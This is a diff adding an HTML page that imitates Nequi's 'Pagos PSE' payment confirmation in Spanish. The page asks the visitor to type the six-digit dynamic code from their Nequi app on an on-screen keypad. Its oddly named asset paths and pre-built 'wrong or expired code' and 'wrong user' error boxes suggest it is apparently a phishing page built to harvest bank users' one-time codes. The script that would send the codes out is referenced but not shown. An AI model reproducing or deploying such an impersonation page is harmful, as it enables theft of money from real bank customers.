@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi Pagos PSE</title>
+    <link rel="stylesheet" href="stylesnequ/styledinami.css">
+</head>
+<body>
+    <div id="loading-overlay">
+        <img src="gif.gif" alt="Cargando">
+    </div>
+    <div id="error-box-dynamic" class="error-box">
+        <div class="error-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <polygon points="12 2 22 20 2 20" fill="white" opacity="0.7"></polygon>
+                <line x1="12" y1="9" x2="12" y2="13" stroke="#ff4d4d"></line>
+                <line x1="12" y1="17" x2="12" y2="17" stroke="#ff4d4d"></line>
+            </svg>
+        </div>
+        <div class="error-message">
+            ¡Ups! Estás ingresando mal tu clave dinámica o expiró, verifica y vuelve a intentarlo
+        </div>
+    </div>
+    <div id="error-box-start" class="error-box">
+        <div class="error-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <polygon points="12 2 22 20 2 20" fill="white" opacity="0.7"></polygon>
+                <line x1="12" y1="9" x2="12" y2="13" stroke="#ff4d4d"></line>
+                <line x1="12" y1="17" x2="12" y2="17" stroke="#ff4d4d"></line>
+            </svg>
+        </div>
+        <div class="error-message">
+            ¡Ups! Estás ingresando mal tu usuario o expiró, verifica y vuelve a intentarlo
+        </div>
+    </div>
+    <div class="container">
+        <div class="content">
+            <div class="text-center">
+                <h1><img src="log1.png" alt="Logo Nequi" class="logo"></h1>
+                <h2>Pagos PSE de Nequi</h2>
+                <p>Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>
+            </div>
+            <div class="code-input">
+                <div class="code-digit"></div>
+                <div class="code-digit"></div>
+                <div class="code-digit"></div>
+                <div class="code-digit"></div>
+                <div class="code-digit"></div>
+                <div class="code-digit"></div>
+            </div>
+            <div class="keypad">
+                <button class="key">1</button>
+                <button class="key">2</button>
+                <button class="key">3</button>
+                <button class="key">4</button>
+                <button class="key">5</button>
+                <button class="key">6</button>
+                <button class="key">7</button>
+                <button class="key">8</button>
+                <button class="key">9</button>
+                <div></div>
+                <button class="key">0</button>
+                <button class="key backspace">
+                    <svg viewBox="0 0 24 24" width="32" height="32" fill="#210049">
+                        <path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H7.07L2.4 12l4.66-7H22v14zm-11.59-2L14 13.41 17.59 17 19 15.59 15.41 12 19 8.41 17.59 7 14 10.59 10.41 7 9 8.41 12.59 12 9 15.59z" />
+                    </svg>
+                </button>
+            </div>
+            <button class="cancel-button">Cancela el pago</button>
+        </div>
+    </div>
+
+    <script src="scripts.js/scriptdina.js"></script>
+</body>
+</html>
